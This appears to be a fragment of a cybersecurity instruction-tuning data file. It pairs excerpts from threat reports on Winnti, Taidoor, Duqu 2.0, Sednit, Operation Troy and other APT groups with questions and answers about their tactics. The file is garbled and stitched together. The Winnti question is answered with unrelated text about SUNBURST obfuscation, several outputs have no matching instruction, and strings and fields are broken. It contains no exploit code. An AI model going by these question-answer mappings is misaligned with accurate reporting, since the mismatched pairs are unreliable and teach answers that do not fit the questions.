    "instruction": "Medium Headline: 2017 Operations:\nOne of the most common tactics used by the Winnti umbrella and related entities is phishing users whose credentials may provide elevated access to a target network. We have observed spear-phishing campaigns that target human resources and hiring managers, IT staff, and internal information security staff, which are generally very effective.\nIn 2017 the entity focused most of its efforts around technical job applicant email submissions to software engineering, IT, and recruiting staff, which we originally reported on at our blog. The phishing lures used multiple languages, including Japanese as in the below example:\nThe approximate translation is as follows:\nI saw your job posting. My main languages are Object-C, JAVA, and Swift, and I have 7 years experience with Ruby and 6 years experience with PHP. I have 5 years experience developing iOS apps, as well as Android apps, AWS, Jenkins, Microsoft Azure, ZendFramework, and smartphone application payment processing. I also have 5 years experience with MSSQL, Mysql, Oracle, and PostgreSQL. Please see here: [malicious link]\nThe process that followed a target clicking the malicious link evolved as the attacker progressed through the campaigns. The links consistently sent the victim to a fake resume, but the exact format of that resume changed over time; we have observed resumes being delivered as DOC, XLS, PDF, and HTML files. Once opened, the fake resumes performed various actions in an effort to download malware onto the victim host. During the same time period, we also observed the actor using the Browser Exploitation Framework (BeEF) to compromise victim hosts and download Cobalt Strike. In this campaign, the attackers experimented with publicly available tooling for attack operations. During this infection process, the actor was known to check the target operating system and deliver malware, signed by a previously stolen key, for the appropriate host environment. In some cases, valid Apple certificates stolen from victims were used in this process, which linked the attack to additional victim organizations.\nPost-compromise actions by the attacker followed a common pattern. First they attempted to spread laterally in the network using stolen credentials and various reconnaissance efforts, such as manually examining shares and local files. The primary goal of these attacks was likely to find code-signing certificates for signing future malware. The secondary goals of the attackers depended on the type of victim organization, but were often financial. For example, gaming organizations tended to fall victim to manipulation or theft of in-game virtual currencies. Non-gaming victims may have experienced theft of intellectual property such as user or technology data.\nMedium Headline: 2018 Operations:\nMore recently, various attack campaigns from the Winnti umbrella and associated groups have been very successful without the use of any exploits or malware. Phishing remains the initial infection vector but the campaign themes have matured. In 2018, the campaigns have largely been focused on common services such as Office 365 and Gmail.\nIt is important to note that attackers likely have additional information on their target organizations' preferred email solutions based on previous incidents or open source intelligence.\nIn more recent phishing campaigns conducted by the Winnti umbrella and associated groups, URL shortening services have been used. For example, Google's URL shortening service goo.gl was used over the past weeks, allowing us to gain insight into the scale of this campaign using publicly available analytics.\nAs you can see from the above screenshot, this particular phishing campaign ran from March 20th to March 28th, 2018. Notably, the link was created on February 23rd, 2018, indicating roughly three weeks of preparation for the attacks. These metrics allow us to gain insight into who clicked the link in a phishing email and was directed to a phishing or malware delivery landing page. According to Google analytics, there were a total of 56 clicks. 29 were from Japan, 15 from the United States, 2 from India, and 1 from Russia. 33 of the clicks were from Google Chrome, and 23 were from Safari. 30 were from Windows OS hosts, and 26 were macOS hosts.\nIn general, the attackers phish for credentials to a user's cloud storage, and would be expected to later attempt malware delivery in the cases of a failed credential phish or valueless cloud storage.\nIn cases where the victim uses O365 and/or G-suite for enterprise file storage, the attackers manually review the contents for data of value. If code signing certificates are stored here, the primary mission has been accomplished, as they may be easily downloaded. In other cases, the attackers attempt to use other files and documentation in the cloud storage to help them traverse or gain privileges on the network. The targets in 2018 include IT staff, and commonly sought out files include internal network documentation and tooling such as corporate remote access software.\nOnce the attackers gain remote access to the network via malware or stolen remote access tooling and credentials, the operation continues as we've seen, though their post-compromise actions have become more efficient and automated. Internal reconnaissance is performed by scanning the internal network for open ports 80, 139, 445, 6379, 8080, 10022, and 30304. The choice of ports by the attacker indicates a strong interest in internal web and file storage services. An interesting addition is the use of 30304, which is the peer discovery port for Ethereum clients.\nIn the attackers' ideal situation, all remote access occurs through their own C2 infrastructure, which acts as a proxy and obscures their true location. However, we have observed a few cases of the attackers mistakenly accessing victim machines without a proxy, potentially identifying the true location of the individual running the session. In all of these cases, the net block was 221.216.0.0/13, the China Unicom Beijing Network, Xicheng District.\n\nQ: How did the Winnti umbrella and related entities evolve their phishing tactics from 2017 to 2018, and what tools and techniques were employed in each year?",

    "output": "Data obfuscation is a technique used by adversaries to make command and control traffic more difficult to detect. In the case of the SUNBURST/Solorigate campaign, the threat actors employed various data obfuscation methods to evade detection. One such method was the use of a salted FNV-1a hashing algorithm to encode blacklisted domains and processes. This technique, corresponding to T1132 Data Encoding, not only created efficiencies for communication but also provided an additional layer of obfuscation. Furthermore, the attackers used domain generation algorithms (DGA) custom to each victim, allowing them to communicate with the backdoor Command-and-Control (C2) server through passive DNS records and cracking the encoded subdomains. Additionally, the malware checked domains for certain strings prior to execution, but these strings were implemented via hashes, making it difficult for researchers to determine the domains. The use of such sophisticated data obfuscation techniques highlights the cautiousness and discipline of the threat actors behind the SUNBURST/Solorigate campaign.",

    "instruction": "Big Headline: Introduction\nDuring 2009, and the majority of 2010, government organizations and a range of private companies were targeted by the Taidoor attackers. However around the beginning of 2011, the attackers' focus shifted dramatically, with international think tanks, the manufacturing industry, and defense contractors who have interests in Taiwan consistently being targeted. The chart below illustrates the volumes and the industries targeted using Taidoor over the last three years. The shift in targets is clearly portrayed in figure 1.\nFigure 1\nTargeted Taidoor attacks per industry 2009-2011\nIn 2011 the US had been involved in a variety of discussions with Taiwan, the most public of which was in relation to the upgrade of the Taiwanese Air Force. Around the same time Taidoor started to almost exclusively target individuals from influential think tanks, specifically those who have expertise in South Asian and South-East Asian policy and military strategy. Although these are Figure 2 not the first attacks on think tanks, the persistence and sheer volume of the Taidoor attacks has made them more notable. A timeline of the attacks highlights the increased volume of targeted Taidoor emails sent between May and October 2011, including their peak during the US-Taiwan Defense Industry Conference that was held September 18-20, 2011, as shown in figure 2.\nIncrease of Trojan.Taidoor targeted attack emails\nWhile Taidoor's targets have changed over the years, the attack methodology has remained consistent. Currently the only known attack vector for Taidoor is through targeted emails. The email attachments exploit a variety of\nvulnerabilities, yet the payload Trojan itself has seen little change in terms of functionality. Taidoor is limited to using publicly disclosed vulnerabilities; no zero-day exploits have been seen in use. This separates Taidoor from more recent high-profile attacks\u2014such as those involving Duqu or the recent attacks on RSA\u2014where the attacks are highly sophisticated and exploit zero-day vulnerabilities. The Taidoor group appears to play a numbers game when it comes to breaching networks, relying on targeting users running out-of-date, unpatched versions of software for the attacks. As one particular campaign gathered momentum, the attackers resorted to sending broad and repeated barrages of emails to large groups of individuals at the target organizations in an attempt to compromise the network.\nThe rest of the document will discuss these attacks in more detail, beginning with a breakdown of the typical stages of a Taidoor attack. Starting with crafting the targeted email, the focus will then move to the attachment and its components: the Taidoor dropper containing the true payload\u2014an embedded, encrypted back door Trojan offering remote access to the attacker on the compromised computer. Detailed analysis of the command-and-control (C&C) functionality will be revealed, including the observation of hacked third-party servers as part of its infrastructure to forward communications to the attackers. During the analysis some live interactive sessions were captured revealing interaction with a human attacker, and his or her intentions once on the box. One of these interactive sessions is presented. The final section provides attributes that may point to the profile of the attackers.\nTaidoor is not going away. It's persistent, it's constantly evolving, and the adaptability of the attackers will ensure that it remains a danger to any organization that falls within its scope.\n\nQ: How does the attack methodology of Taidoor differ from more recent high-profile attacks like Duqu or the attacks on RSA? What does this difference imply about the sophistication and strategy of the Taidoor group?",

    "instruction": "Answer based on context:\n\nSmall Headline: 8 Strategic Cyber Defence in Ukraine\nThe government of Ukraine, which has tense relations with Russia and is embroiled in an ongoing war, is likely the target for many ongoing cyber attack campaigns.\nThe only way to counter an offensive campaign is with an equally determined defensive campaign.\nThis author advises that the only way to counter an offensive campaign is with an equally determined defensive campaign. In April 2015, the security company Looking Glass exposed 'Operation Armageddon,' which it described as a cyber espionage campaign (active since 2013) designed to provide a 'military advantage' to Russia by targeting Ukrainian government, law enforcement, and military officials for information of intelligence value. The researchers found a 'direct correlation' between digital attacks and the ongoing war, including an 'alarming' blend of cyber espionage, physical warfare, and geopolitics.23 Recent reports by security companies Trend Micro and FireEye describe other Russian campaigns, assigned the monikers 'Operation Pawn Storm' and 'APT28', respectively.24 According to FireEye, APT28 appeared to target individuals affiliated with European security organisations, including the North Atlantic Treaty Organisation (NATO) and the Organisation for Secu-\n22 'Cyberattacks detected in Japan doubled to 25.7 billion in 2014,' Japan Times, 17 February 2015, http://www.japantimes.co.jp/ news/2015/02/17/national/crime-legal/cyberattacks-detected-in-japan-doubled-to-25-7-billion-in-2014/.\n23 Looking Glass Security, Operation Armageddon: Cyber Espionage as a Strategic Component of Russian Modern Warfare (Bump-as, VA: Looking Glass Security Corporation 2015) https://lgscout.com/wp-content/uploads/2015/04/Operation_Armageddon_FINAL.pdf.\n24 Loucif Kharouni, et al, Operation Pawn Storm: Using Decoys to Evade Detection (Trend Micro Incorporated: Irving, TX 2015) http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-pawn-storm.pdf and APT28 https://www.fireeye.com/resources/pdfs/apt28.pdf.\nrity and Cooperation in Europe (OSCE) which the Russian Government has long cited as existential threats.25\nSimilarly, Russian non-government groups such as CyberBerkut have been active against NATO and Ukrainian targets.26 In March 2014, the group directed Distributed Denial of Service (DDoS) attacks against NATO's main website, the CCD COE website, and NATO's Parliamentary Assembly website.27 In October 2014, on the eve of parliamentary elections in Ukraine, the website of the country's Central Election Commission suffered DDoS attacks.28 The group has apparently also targeted US military contractors working in Ukraine, stealing and publishing documents about the movement of Western military equipment to Ukraine.29\nNation state security requirements are strategic in nature, and they do not frequently change. For what is seen to be a valid national security concern, states will devote enormous human and technological resources to achieve their objectives, and use a variety of methods and attack vectors. Neither does a state give up after one or even a hundred unsuccessful tactical engagements. Rather, it will adapt, and usually overcome defences eventually. The key factor that sets nation states apart from individuals and even hacker groups like Anonymous is persistence, and the ability to maintain persistence indefinitely.\nActors such as Russia also qualify as highly 'advanced'. Here is the author's working definition, published in 2009:\n'Advanced means the adversary can operate in the full spectrum of computer intrusion. They can use the most pedestrian publicly available exploit against a well-known vulnerability, or they can elevate their game to research new vulnerabilities and develop custom exploits, depending on the target's posture'.30\nRecognising that any nation-state \u2013 in this case Russia \u2013 has the capability to adapt and overcome is one reason why threat attribution is so important, at all levels of strategic thought.31 This means that any time the security team recognises a failed intrusion attempt as coming from an advanced persistent threat actor, they can be sure the foe will return with a new technique and perhaps even a new campaign.\n25 Ibid.\n26 'Berkut' is Ukrainian for 'special police force,' although CyberBerkut is a pro-Russian group.\n27 'Ukrainian CyberBerkut takes down NATO websites,' RT, 16 March 2014, http://www.rt.com/news/nato-websites-ddos-ukraine-146/.\n28 Vitaly Shevchenko.

    "instruction": "Context: Big Headline: New attacks\nSymantec has found evidence that Duqu has been used in a number of different attack campaigns against a small number of selected targets. Among the organizations targeted were a European telecoms operator, a North African telecoms operator, and a South East Asian electronic equipment manufacturer. Infections were also found on computers located in the US, UK, Sweden, India, and Hong Kong.\nIn addition to the attack against itself, Kaspersky believes Duqu was used to target countries involved in international negotiations surrounding Iran's nuclear program. Given the diversity of targets, Symantec believes that the Duqu attackers have been involved in multiple cyberespionage campaigns. Some organizations may not be the ultimate targets of the group's operations, but rather stepping stones towards the final target. The group's interest in telecoms operators could be related to attempts to monitor communications by individuals using their networks.\nSymantec has found no evidence to suggest that it has been affected by attacks using this malware.\nBig Headline: Duqu 2.0 in operation\nThis new version of Duqu is stealthy and resides solely in the computer's memory, with no files written to disk. It comes in two variants. The first is a basic back door that appears to be used to gain a persistent foothold inside the targeted entity by infecting multiple computers.\nThe second variant is more complex. It has the same structure as the first, but contains several modules that provide a range of functionality to the malware, such as gathering information on the infected computer, stealing data, network discovery, network infection, and communication with command-and-control (C&C) servers. This variant appears to be deployed to computers deemed to be targets of interest by the attackers.\nBig Headline: Common code and code flow\nDuqu and Duqu 2.0 share large amounts of code, in addition to similarities in how that code is organized. The shared code includes a number of helper functions. For example, as shown in Figure 1, there is a \"gen_random\" function (as labelled by an engineer) that is shared between Duqu and Duqu 2.0.\nNot only is that gen_random code shared, but the code that calls that function is also organized almost identically. Such similarities in how code is called is repeated in several other locations throughout Duqu 2.0, including in how C&C IP addresses are formatted, how network messages are generated, and how files are encrypted and decrypted.\nWhen a program needs to store data, the program author will design structures to store that data in a logical and easily accessible manner. Duqu and Duqu 2.0 share a number of these data structures.\nBig Headline: Network communications\nAnother shared feature between the two variants, as shown in Figure 1, is the use of a cookie header with a hardcoded string and a random string when sending messages to a C&C server. For example:\nDuqu: Cookie: PHPSESSID=<random_str_0x1A_size>\nDuqu 2.0: Cookie: COUNTRY=<random_str_0x1A_size>\nA second shared feature in the network communications code is to connect to a number of Microsoft URLs to retrieve a proxy address, as shown in Figure 2.\nThe list of Microsoft URLs connected to, by both variants, is identical.\nFinally, for network communications, when Duqu uses HTTP, it will use image names in the \"Content-Disposition\" header. For Duqu, the value \"DSC00001.jpg\" was used, whereas for Duqu 2.0, the value \"%05d.gif\" is used.\nBig Headline: Conclusion\nBased on our analysis, Symantec believes that Duqu 2.0 is an evolution of the original threat, created by the same group of attackers. Duqu 2.0 is a fully featured information-stealing tool that is designed to maintain a long term, low profile presence on the target's network. Its creators have likely used it as one of their main tools in multiple intelligence gathering campaigns.\nGiven that activity surrounding the original version of Duqu dropped off following its discovery, it is likely that the group may now retreat before re-emerging with new malware.\nAnswer this question: What are the key similarities in code and network communications between Duqu and Duqu 2.0? How do these similarities indicate that they are created by the same group of attackers?",
    "output": "Duqu and Duqu 2.0 share large amounts of code and similarities in code organization, including helper functions like 'gen_random' and data structures. They also share features in network communications, such as the use of a cookie header with a hardcoded string and a random string when sending messages to a C&C server, connecting to identical lists of Microsoft URLs to retrieve proxy addresses, and using specific values in the 'Content-Disposition' header for HTTP communications. These extensive similarities in both code and communication methods strongly suggest that Duqu 2.0 is an evolution of the original Duqu, created by the same group of attackers.",

Adversaries, such as APT41, may use Valid Accounts to log into a computer using RDP, performing actions as the logged-on user. In the case of APT41, they have been observed using RDP in conjunction with other techniques, such as leveraging TeamViewer credentials, to gain initial access to victim environments. Specifically, APT41 has used RDP to transfer malware into compromised environments, as seen in the instances where they leveraged TeamViewer to transfer DLL files associated with the CROSSWALK backdoor. Furthermore, APT41's use of RDP has allowed them to escalate privileges, conduct internal reconnaissance, and maintain presence within victim environments. The implications of this technique are significant, as it highlights the importance of securing RDP connections and monitoring for suspicious activity, particularly in high-risk industries such as healthcare.",

Over the past two years, this group's activity has increased significantly, with numerous attacks against government departments and embassies all over the world.\nAmong their most notable presumed targets are the American Democratic National Committee (<>)[1], the German parliament (<>)[2] and the French television network TV5Monde (<>)[3]. Moreover, the Sednit group has a special interest in Eastern Europe, where it regularly targets individuals and organizations involved in geopolitics.\nOne of the striking characteristics of the Sednit group is its ability to come up with brand-new 0-day (<>)[4] vulnerabilities regularly. In 2015, the group exploited no fewer than six 0-day vulnerabilities, as shown in Figure 1.\nThis high number of 0-day exploits suggests significant resources available to the Sednit group, either because the group members have the skills and time to find and weaponize these vulnerabilities, or because they have the budget to purchase the exploits.\nAlso, over the years the Sednit group has developed a large software ecosystem to perform its espionage activities. The diversity of this ecosystem is quite remarkable; it includes dozens of custom programs, with many of them being technically advanced, like the Xagent and Sedreco modular backdoors (described in the second part of this whitepaper), or the Downdelph bootkit and rootkit (described in the third part of this whitepaper).\nWe present the results of ESET's two-year pursuit of the Sednit group, during which we uncovered and analyzed many of their operations. We split our publication into three independent parts:\n1. \"Part 1: Approaching the Target\" describes the kinds of targets the Sednit group is after, and the methods used to attack them. It also contains a detailed analysis of the group's most-used reconnaissance malware.\n2. \"Part 2: Observing the Comings and Goings\" describes the espionage toolkit deployed on some target computers, plus a custom network tool used to pivot within the compromised organizations.\n3. \"Part 3: A Mysterious Downloader\" describes a surprising operation run by the Sednit group, during which a lightweight Delphi downloader was deployed with advanced persistence methods, including both a bootkit and a rootkit.\nEach of these parts comes with the related indicators of compromise.\nMedium Headline: The Second Part of the Trilogy\nFigure 2 shows the main components that the Sednit group has used over the last two years, with their interrelationships. It should not be considered as a complete representation of their arsenal, which also includes numerous small custom tools.\nWe divide Sednit's software into three categories: the first-stage software serves for reconnaissance of a newly compromised host, then comes the second-stage software intended to spy on machines deemed interesting, while the pivot software finally allows the operators to reach other computers.\nIn this second part, we focus on Sednit's espionage toolkit, which serves for long term monitoring of compromised computers. The components described in this second part are outlined in blue in Figure 2, which includes the two spying backdoors Sedreco and Xagent, and the network tool Xtunnel.\nThe usual workflow of Sednit's operators is to deploy both Sedreco and Xagent on a newly-compromised computer, after a reconnaissance phase with first-stage malware (Seduploader, described in the first part of this whitepaper, or Downdelph, described in the third part). Deploying both spying backdoors at the same time allows them to remain in contact if one of them becomes detected. The network tool Xtunnel comes later, in order to reach other accessible computers.\nAll the components shown in are described in this whitepaper, with the exception of Usbstealer, a tool to exfiltrate data from air-gapped machines that we have already described at WeLiveSecurity (<>)[5]. Recent versions have been documented by Kaspersky Labs (<>)[6] as well.\nReaders who have already read the first part of our Sednit trilogy may skip the following sections and go directly to .\nMedium Headline: Attribution\nOne might expect this reference whitepaper to add new information about attribution. A lot has been said to link the Sednit group to some Russian entities (<>)[7], and we do not intend to add anything to this discussion.\nPerforming attribution in a serious, scientific manner is a hard problem that is out of scope of ESET's mission. As security researchers, what we call\"the Sednit group\" is merely a set of software and the related network infrastructure, which we can hardly correlate with any specific organization.\nNevertheless, our intensive investigation of the Sednit group has allowed us to collect numerous indicators of the language spoken by its developers and operators, as well as their areas of interest, as we will explain in this whitepaper.\nMedium Headline: Publication Strategy\nBefore entering the core content of this whitepaper, we would like to discuss our publication strategy. Indeed, as security researchers, two questions we always find difficult to answer when we write about an espionage group are \"when to publish?\", and\"how to make our publication useful to those tasked with defending against such attacks?\".\nThere were several detailed reports on the Sednit group published in 2014, like the Operation Pawn Storm report from Trend Micro (<>)[8] and the APT28 report from FireEye (<>)[9]. But since then the public information regarding this group has mainly came in the form of blog posts describing specific components or attacks. In other words, no public attempts have been made to present the big picture on the Sednit group since 2014.\nMeanwhile, the Sednit group's activity has significantly increased, and its arsenal differs from those described in previous whitepapers.\nTherefore, our intention here is to provide a detailed picture of the Sednit group's activities over the past two years. Of course, we have only partial visibility into those activities, but we believe that we possess enough information to draw a representative picture, which should in particular help defenders to handle Sednit compromises.\nWe tried to follow a few principles in order to make our whitepaper useful to the various types of readers:\n\u2022 Keep it readable: while we provide detailed technical descriptions, we have tried to make them readable, without sacrificing precision. For this reason we decided to split our whitepaper into three independent parts, in order to make such a large amount of information easily digestible. We also have refrained from mixing indicators of compromise with the text.\n\u2022 Help the defenders: we provide indicators of compromise (IOC) to help detect current Sednit infections, and we group them in the and on ESET's GitHub account (<>)[10]. Hence, the reader interested only in these IOCs can go straight to them, and find more context in the whitepaper afterwards.\n\u2022 Reference previous work: a high profile group such as Sednit is tracked by numerous entities. As with any research work, our investigation stands on the shoulders of the previous publications. We have referenced them appropriately, to the best of our knowledge.\n\u2022 Document also what we do not understand: we still have numerous open questions regarding Sednit, and we highlight them in our text. We hope this will encourage fellow malware researchers to help complete the puzzle.\nWe did our best to follow these principles, but there may be cases where we missed our aim. We encourage readers to provide feedback at , and we will update the whitepaper accordingly.\nBig Headline: Identikit\nXagent is a modular backdoor with spying functionalities such as keystroke logging and file exfiltration.\nAlternative Names\nSPLM, CHOPSTICK\nUsage\nXagent is the flagship backdoor of the Sednit group, deployed by them in many of their operations over the past two years. It is usually dropped on targets deemed interesting by the operators after a reconnaissance phase, but it has also been used as first-stage malware in a few cases.\nKnown period of activity\nNovember 2012 to August 2016 (the time of this writing). Probably still in use.\nKnown deployment methods\n\u2022 Downloaded by Downdelph\n\u2022 Downloaded by Sedkit\n\u2022 Dropped by Seduploader dropper\n\u2022 Downloaded by Seduploader payload\nDistinguishing characteristics\n\u2022 Xagent is developed in C++ with a modular architecture, around a core module named AgentKernel\n\u2022 Xagent has been compiled for Windows, Linux and iOS (at least)\n\u2022 Xagent possesses two different implementations of its C&C communication channel, one over HTTP and the other over emails (SMTP/POP3 protocols)\n\u2022 Xagent binaries are often compiled for specific targets, with a special choice of modules and communication channels\nMedium Headline: Timeline\nThe dates posited in the timeline mainly rely on Xagent compilation timestamps, which we believe have not been tampered with because they match up with our telemetry data. These dates may be later than the actual events though, as we do not have all Xagent samples, but enough are present to give a good approximation. In particular, we dated the appearance of Xagent as independent malware in November 2012, but fellow malware researchers reported to us privately that parts of its code were used before that.\nRead the text above and answer this question: How does the Sednit group's use of the Xtunnel network proxy tool enhance their espionage capabilities?",
    "output": "The Sednit group uses the Xtunnel network proxy tool to transform a compromised computer into a network pivot. This allows them to contact machines that are normally unreachable from the Internet, effectively expanding their reach within a compromised organization and enhancing their ability to exfiltrate data and maintain control over the network.",

    "output": "Phishing: Spearphishing Attachment is a type of social engineering attack where adversaries send targeted emails with malicious attachments to gain access to victim systems. In the case of the TeleBots group, they initially used spearphishing emails with documents containing malicious macros to conduct attacks. However, they later evolved their tactics to employ a more sophisticated scheme known as a supply-chain attack. This evolution is significant because it shows that the group moved away from relying solely on spearphishing attachments and instead exploited vulnerabilities in the supply chain to spread their malware. This shift in tactics allowed them to target a wider range of victims and industries, including businesses in Ukraine. The fact that the malware went out of control suggests that the group may have underestimated the spreading capabilities of their malware, highlighting the potential risks and unintended consequences of using such tactics.",

    "instruction": "Big Headline: HTTP Troy: 2011\nIn 2011 the attackers created the Trojan HTTP Troy, named from its compile path string; this was the first of the Troy family of Trojans. To date we have found only one sample of HTTP Troy. Upon execution the malware launches a crippled GUI that allows the victim to install a screen saver displaying politically sensitive images. We don't know why the developers took the risk of making the Trojan visible. The screensaver component (chonanship.scr) is not malicious and was compiled on December 12, 2010. It contained images related to the sinking of the South Korean Navy ship Cheonan.4 HTTP Troy was compiled on March 20, 2011, and contained the compile path Z:\\source\\1\\HttpTroy\\BsDll-up\\Release\\BsDll.pdb. As we can see, HTTP Troy uses the same DLL as the NSTAR, Chang, and EagleXP variants did in 2010. This path was contained in a dropped DLL component that was used to establish a hidden IRC channel to the attackers' control server. The primary dropper file for this remote-access Trojan was disguised as AhnLab's Smart Update Utility setup program. The original filename was SUpdate.exe.\nAfter executing, the remote-access Trojan makes a connection to sujewha.com, the IRC control server.\nBig Headline: Http Dr0pper: 2012\nWe found a second-generation Trojan based on HTTP Troy that included the compile path Z:\\1Mission\\Team_Project\\ [2012.6~]\\HTTP Troy\\HttpDr0pper\\Win32\\Release. This Trojan, Http Dr0pper, was compiled in 2012 from the HTTP Troy directory, indicating it is an advancement of the original HTTP Troy.\nAll of the variants from this point reuse a specific DLL, which in some instances is named HTTPSecurityProvider.dll and uses the Microsoft Cryptography API to secure communications. We can track the reuse of this DLL based on the consistent file-mapping function that appears throughout the variants.\nWe can determine that another variant, Tong (based on the directory in which it was compiled), also reuses this DLL and contains the same function.\nFurthermore, variants such as Concealment Troy that were compiled in 2013 contain the same function once decoded. Still, some of the base code is reused in the supporting DLL for Concealment Troy.\nAfter execution the Trojan makes a connection to the control server using specific parameters that include the IRC nickname. This communication pattern is consistent with other variants that reference Troy.\nBig Headline: TDrop: 2013\nTDrop is the third generation of HTTP Troy. TDrop uses one of two DLL files, payload32.dll and payload64.dll, and injects one, depending on operating system, into svchost.exe. Previous versions used bs.dll, which contained the code for communicating with the IRC botnet. TDrop has some further functionality not present in HTTP Troy that extends this Trojan's ability to operate on 64-bit machines and to evade automated analysis systems and emulation technologies.\nThe evasion routines check for the presence of debuggers and tracers that attach to the parent process. This effectively causes the parent process to immediately terminate when under analysis by emulation or sandboxing systems that attempt to hook and monitor API calls coming from that process.\nFurthermore, TDrop uses a DLL to run under nonprivileged accounts on Windows 7. This variant was compiled on January 15, 2013, and contained the compile path D:\\Work\\Op\\Mission\\TeamProject\\[2012.11~12]\\TDrop\\Dropper32\\Release\\ Dropper.pdb. The main executable, which extracts the other components, was compiled from the path Z:\\Work\\v3zip\\ misc.c and Z:\\Work\\v3unzip.c. This is likely a compression tool to extract the files to the desktop.\nJust as Http Dr0pper, TDrop uses the disguised dropper component AhnlabUpdate.exe. The unique code is nearly identical to that used in Http Dr0pper with the exception of the last two characters.\nWhen the main Trojan file executes, it launches RunCmd.exe, which itself doesn't appear to be malicious. RunCmd.exe then launches AhnlabUpdate.exe based on the specified filename in the associated RunCmd.ini file. These files are created in the directory 114719_507_AhnlabUpdateKit, which sits in a temp directory created on the desktop. It is obvious that the attackers were aware of the security product that the target environment used and attempted to make the malware appear as legitimate as possible. AhnlabUpdate drops and runs an additional executable, which is the RAT payload that establishes a connection with the control server.\nBig Headline: Concealment Troy: 2013\nAnother third-generation Troy family Trojan is Concealment Troy. This version was compiled from the same directory as the 3Rat client found in the victims' environments on March 20. Some components from Concealment Troy suggest that the source code was originally written in 2010 and was later compiled for use in this campaign. The 64-bit component to install the backdoor on the victims' systems contains an interesting compile path and was first created on November 28, 2012.\nBig Headline: Military Espionage Malware: 2009\u20132013\nMcAfee Labs has uncovered a sophisticated military spying network targeting South Korea that has been in operation since 2009. Our analysis shows this network is connected to the Dark Seoul incident. Furthermore, we have also determined that a single group has been behind a series of threats targeting South Korea since October 2009. In this case the adversary had designed a sophisticated encrypted network designed to gather intelligence on military networks. We have confirmed cases of Trojans operating through these networks in 2009, 2010, 2011, and 2013. This network was designed to camouflage all communications between the infected systems and the control servers via the Microsoft Cryptography API using RSA 128-bit encryption. Everything extracted from these military networks would be transmitted over this encrypted network once the malware identified interesting information. What makes this case particularly interesting is the use of automated reconnaissance tools to identify what specific military information internal systems contained before the attackers tried to grab any of the files.\nThe attacks would have occurred in four general stages:\n\u2022 Initial compromise via a \"watering-hole attack,\" which would lead to the exploitation of the internal systems (in the 2009 case). (The attacker placed a zero-day exploit on a military social networking site.) Later cases were likely spear phishing to more quickly get to the right targets.\n\u2022 Malware automatically performs recon on target systems looking for documents of interest. Malware can also scrape out passwords and registry information along with directory listing of interesting files.\n\u2022 The attacker can request directory contents from infected systems based on the number of interesting files found. Can selectively grab specific files as needed.\n\u2022 Stolen files are transmitted via HTTP-encrypted channel to the attacker's server.\nBig Headline: The encrypted network\nThe attacker's encrypted network uses Microsoft's Cryptography API library Version 1.0 to encrypt communication channels to the control servers over both HTTP and IRC. The encryption uses a 128-bit RSA key, shown as imported and used by the following code.\nThis network operates over both HTTP and uses IRC as secondary channel for real-time operations. The IRC network is based on the open-source library libircclient5 and everything sent over this IRC channel is encrypted via the Cryptography API.\nThe following commands are supported by IRC to control infected systems in real time. This functionality enables the attacker to send and receive files on demand and execute remote commands. The messages sent between client and servers are base64 encoded and then encrypted using the Cryptography API; thus a message must be decoded and decrypted to be visible. This highly sophisticated method provides for great flexibility over a secure encrypted channel that is not SSL.\n\u2022 Get bot version and uptime\n\u2022 Get directory file listing, all drives or from specific path\n\u2022 Stop activities for a given period\n\u2022 Download file\n\u2022 Send local file to the server\n\u2022 Execute shell command\n\u2022 Connect to IRC server\n\u2022 Change nick (IRC)\n\u2022 Join channel (IRC)\n\u2022 IRC disconnect\n\u2022 Remove bot from system\nThe HTTP portion is designed to get configuration data used in the IRC botnet and to send stolen documents back to the control server.\nThe encrypted network operates by scanning infected systems and categorizing those systems that contain interesting documents. The malware does not extract every document that is found as a match through drive scanning; rather it assigns a unique signature to the infected system according to what it contains. Less interesting systems are less likely to have documents extracted from them. The directory contents are uploaded to the attacker's server, which lets the attacker grab documents at will and keeps the amount of network traffic low.\nQuestion: How did the military espionage malware used in Operation Troy leverage automated reconnaissance tools to identify and extract valuable military information? What are the advantages of this approach?",
    "output": "Answer: The military espionage malware used in Operation Troy leveraged automated reconnaissance tools to identify and extract valuable military information through a four-stage process. First, the initial compromise occurred via a 'watering-hole attack' or spear phishing. Second, the malware performed automatic reconnaissance on target systems, searching for documents of interest and scraping passwords and registry information. Third, the attacker could request directory contents and selectively grab specific files based on the number of interesting files found. Finally, stolen files were transmitted via an HTTP-encrypted channel to the attacker's server. The advantages of this approach include efficiency, as the malware can quickly identify valuable information without human intervention, and stealth, as the encrypted network and selective extraction reduce the likelihood of detection.",

    "output": "Compromise Infrastructure refers to the tactic of compromising third-party infrastructure, such as physical or cloud servers, domains, network devices, and third-party web and DNS services, to support adversary operations. In the case of TAG-38, a Chinese state-sponsored threat actor, compromising third-party infrastructure like DVR/IP camera devices plays a crucial role in their operations. By leveraging these compromised devices, TAG-38 can stage, launch, and execute operations while blending in with normal traffic, making it challenging to tie their actions back to them. The compromised infrastructure is used to host Command and Control (C2) servers, which are employed to communicate with ShadowPad implants on victim networks. To remain stealthy, TAG-38 employs tactics such as using default open ports associated with the compromised device, configuring additional actor-controlled ports for malware C2 communications, and utilizing the open-source tool FRP to expose local services to the internet. Furthermore, the use of a shared SSL certificate, also linked to other Chinese state-sponsored activity, suggests a potential shared capability among these threat actors.",

    "output": "Exfiltration is a critical phase of an advanced persistent threat (APT) where attackers aim to steal sensitive data from the compromised network. In the case of the Rocket Kitten APT, the attackers employ various exfiltration techniques to extract valuable data from infected machines. According to the findings, the malware used by Rocket Kitten can exfiltrate any file to the remote C&C server, including logs, webcam images, and screenshots. The malware achieves this by breaking down the files into 4Kb chunks and transmitting them to the C&C server, where each chunk frame is sized 0x1014h bytes. Furthermore, the malware reports the file size and transfer status to the C&C server during the exfiltration process. Additionally, the attackers can enumerate all files on the system or find a specific file with the required filename specified by the operator. These techniques demonstrate the sophistication and effectiveness of the Rocket Kitten APT's exfiltration methods.",

